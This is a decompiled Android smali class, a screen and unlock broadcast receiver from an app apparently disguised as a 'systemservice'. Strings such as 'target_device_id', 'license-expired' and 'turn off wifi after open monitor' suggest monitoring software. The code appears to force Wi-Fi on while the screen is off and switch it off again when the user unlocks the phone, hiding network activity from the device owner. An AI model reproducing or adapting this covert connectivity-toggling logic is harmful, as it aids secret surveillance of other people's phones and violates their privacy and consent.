.class public Lcom/systemservice/common/boostReceiver/UIUserPresentReceiver;
.super Landroid/content/BroadcastReceiver;
.source ""


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/systemservice/common/boostReceiver/UIUserPresentReceiver$a;
    }
.end annotation


# static fields
.field public static a:Z = false


# instance fields
.field public b:Z

.field c:Z

.field d:Ljava/util/Timer;

.field e:Lcom/systemservice/a/e/c;

.field f:Lcom/systemservice/a/h/d;

.field g:Lcom/systemservice/a/h/k;


# direct methods
.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/systemservice/common/boostReceiver/UIUserPresentReceiver;->b:Z

    iput-boolean v0, p0, Lcom/systemservice/common/boostReceiver/UIUserPresentReceiver;->c:Z

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 9

    const-string v0, "offline"

    const-string v1, ""

    const-string v2, "Screen"

    new-instance v3, Lcom/systemservice/a/e/c;

    invoke-direct {v3}, Lcom/systemservice/a/e/c;-><init>()V

    iput-object v3, p0, Lcom/systemservice/common/boostReceiver/UIUserPresentReceiver;->e:Lcom/systemservice/a/e/c;

    new-instance v3, Ljava/util/Date;

    invoke-direct {v3}, Ljava/util/Date;-><init>()V

    new-instance v3, Lcom/systemservice/a/h/d;

    invoke-direct {v3, p1}, Lcom/systemservice/a/h/d;-><init>(Landroid/content/Context;)V

    iput-object v3, p0, Lcom/systemservice/common/boostReceiver/UIUserPresentReceiver;->f:Lcom/systemservice/a/h/d;

    new-instance v3, Lcom/systemservice/a/h/k;

    invoke-direct {v3, p1}, Lcom/systemservice/a/h/k;-><init>(Landroid/content/Context;)V

    iput-object v3, p0, Lcom/systemservice/common/boostReceiver/UIUserPresentReceiver;->g:Lcom/systemservice/a/h/k;

    invoke-virtual {p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    const/4 v4, 0x0

    const-string v5, "app_prefs_settings"

    invoke-virtual {v3, v5, v4}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v3

    invoke-interface {v3}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v5

    invoke-interface {v5}, Landroid/content/SharedPreferences$Editor;->apply()V

    :try_start_0
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "internet offline is: "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-interface {v3, v0, v4}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v2, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v5

    const-string v6, "android.intent.action.USER_PRESENT"

    invoke-virtual {v5, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    const/4 v6, 0x0

    if-eqz v5, :cond_0

    const-string v0, "AUIAccessibilityService"

    const-string v3, "ACTION USER PRESENT is OPEN"

    invoke-static {v0, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    const-string v0, "ACTION_USER_PRESENT"

    invoke-static {v2, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-virtual {p0}, Landroid/content/BroadcastReceiver;->goAsync()Landroid/content/BroadcastReceiver$PendingResult;

    move-result-object v0

    new-instance v2, Lcom/systemservice/common/boostReceiver/UIUserPresentReceiver$a;

    invoke-direct {v2, p1, v0, p2, v6}, Lcom/systemservice/common/boostReceiver/UIUserPresentReceiver$a;-><init>(Landroid/content/Context;Landroid/content/BroadcastReceiver$PendingResult;Landroid/content/Intent;Lcom/systemservice/common/boostReceiver/k;)V

    new-array p1, v4, [Ljava/lang/String;

    invoke-virtual {v2, p1}, Landroid/os/AsyncTask;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    goto/16 :goto_3

    :cond_0
    const-string v5, "license-expired"

    invoke-interface {v3, v5, v4}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v5

    iput-boolean v5, p0, Lcom/systemservice/common/boostReceiver/UIUserPresentReceiver;->c:Z

    iget-boolean v5, p0, Lcom/systemservice/common/boostReceiver/UIUserPresentReceiver;->c:Z

    if-eqz v5, :cond_1

    sget-object p1, Lcom/systemservice/a/a/j;->h:Lorg/apache/log4j/Logger;

    const-string p2, "is_licensed = true"

    invoke-virtual {p1, p2}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    return-void

    :cond_1
    sget-object v5, Lcom/systemservice/a/a/j;->a:Ljava/lang/String;

    invoke-interface {v3, v5, v4}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v5

    if-eqz v5, :cond_2

    sget-object p1, Lcom/systemservice/a/a/j;->h:Lorg/apache/log4j/Logger;

    const-string p2, "The device is removed!"

    invoke-virtual {p1, p2}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    return-void

    :cond_2
    const-string v5, "target_device_id"

    invoke-interface {v3, v5, v1}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_3

    const-string v7, "android.intent.action.SCREEN_OFF"

    if-nez v5, :cond_3

    :try_start_1
    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_3

    new-instance v5, Ljava/lang/Thread;

    new-instance v8, Lcom/systemservice/common/boostReceiver/k;

    invoke-direct {v8, p0, p1, v3}, Lcom/systemservice/common/boostReceiver/k;-><init>(Lcom/systemservice/common/boostReceiver/UIUserPresentReceiver;Landroid/content/Context;Landroid/content/SharedPreferences;)V

    invoke-direct {v5, v8}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v5}, Ljava/lang/Thread;->start()V

    :cond_3
    const-string v5, "system_force_internet"

    invoke-interface {v3, v5, v4}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v5

    if-eqz v5, :cond_7

    sget-boolean v5, Lcom/systemservice/a/a/j;->c:Z

    if-eqz v5, :cond_7

    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object p2

    invoke-virtual {p2, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p2
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_3

    const-string v5, "timer != null"

    if-eqz p2, :cond_5

    :try_start_2
    const-string p2, "ACTION_SCREEN_OFF"

    invoke-static {v2, p2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-interface {v3, v0, v4}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result p2

    if-eqz p2, :cond_7

    const/4 p2, 0x1

    invoke-static {p1, p2}, Lcom/systemservice/a/a/l;->a(Landroid/content/Context;Z)V

    sput-boolean p2, Lcom/systemservice/common/boostReceiver/UIUserPresentReceiver;->a:Z
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_3

    :try_start_3
    new-instance v0, Ljava/util/Timer;

    invoke-direct {v0}, Ljava/util/Timer;-><init>()V

    iput-object v0, p0, Lcom/systemservice/common/boostReceiver/UIUserPresentReceiver;->d:Ljava/util/Timer;

    iget-object v0, p0, Lcom/systemservice/common/boostReceiver/UIUserPresentReceiver;->d:Ljava/util/Timer;

    new-instance v3, Lcom/systemservice/common/boostReceiver/l;

    invoke-direct {v3, p0, p1}, Lcom/systemservice/common/boostReceiver/l;-><init>(Lcom/systemservice/common/boostReceiver/UIUserPresentReceiver;Landroid/content/Context;)V

    const-wide/16 v7, 0x7530

    invoke-virtual {v0, v3, v7, v8}, Ljava/util/Timer;->schedule(Ljava/util/TimerTask;J)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0

    goto :goto_1

    :catch_0
    move-exception p1

    :try_start_4
    sput-boolean p2, Lcom/systemservice/common/boostReceiver/UIUserPresentReceiver;->a:Z

    sput-boolean v4, Lcom/systemservice/a/a/j;->c:Z
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_3

    :try_start_5
    iget-object v0, p0, Lcom/systemservice/common/boostReceiver/UIUserPresentReceiver;->d:Ljava/util/Timer;

    if-eqz v0, :cond_4

    iget-object v0, p0, Lcom/systemservice/common/boostReceiver/UIUserPresentReceiver;->d:Ljava/util/Timer;

    invoke-virtual {v0}, Ljava/util/Timer;->cancel()V

    iput-object v6, p0, Lcom/systemservice/common/boostReceiver/UIUserPresentReceiver;->d:Ljava/util/Timer;

    const-string v0, "SCreen"

    invoke-static {v0, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_1

    goto :goto_0

    :catch_1
    move-exception v0

    :try_start_6
    const-string v3, "Screen ee"

    invoke-static {v3, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    sput-boolean p2, Lcom/systemservice/common/boostReceiver/UIUserPresentReceiver;->a:Z

    :cond_4
    :goto_0
    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-static {v2, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    :goto_1
    sput-boolean p2, Lcom/systemservice/common/boostReceiver/UIUserPresentReceiver;->a:Z

    goto :goto_3

    :cond_5
    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "auto_TurnOnWiFi = "

    invoke-virtual {p2, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-boolean v7, Lcom/systemservice/common/boostReceiver/UIUserPresentReceiver;->a:Z

    invoke-virtual {p2, v7}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    invoke-static {v2, p2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    sget-boolean p2, Lcom/systemservice/common/boostReceiver/UIUserPresentReceiver;->a:Z

    if-eqz p2, :cond_6

    invoke-static {p1, v4}, Lcom/systemservice/a/a/l;->a(Landroid/content/Context;Z)V

    sput-boolean v4, Lcom/systemservice/a/a/j;->c:Z

    const-string p1, "turn off wifi after open monitor"

    invoke-static {v2, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_3

    :try_start_7
    iget-object p1, p0, Lcom/systemservice/common/boostReceiver/UIUserPresentReceiver;->d:Ljava/util/Timer;

    if-eqz p1, :cond_6

    iget-object p1, p0, Lcom/systemservice/common/boostReceiver/UIUserPresentReceiver;->d:Ljava/util/Timer;

    invoke-virtual {p1}, Ljava/util/Timer;->cancel()V

    iput-object v6, p0, Lcom/systemservice/common/boostReceiver/UIUserPresentReceiver;->d:Ljava/util/Timer;

    invoke-static {v2, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_2

    goto :goto_2

    :catch_2
    move-exception p1

    :try_start_8
    const-string p2, "timerr != null"

    invoke-static {v2, p2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    :cond_6
    :goto_2
    sput-boolean v4, Lcom/systemservice/common/boostReceiver/UIUserPresentReceiver;->a:Z

    const-string p1, "ACTION_SCREEN_ON"

    invoke-static {v2, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    const-string p2, "internet offline is1: "

    invoke-virtual {p1, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-interface {v3, v0, v4}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result p2

    invoke-virtual {p1, p2}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v2, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_3

    goto :goto_3

    :catch_3
    move-exception p1

    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const-string p2, "TAG"

    invoke-static {p2, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :cond_7
    :goto_3
    return-void
.end method
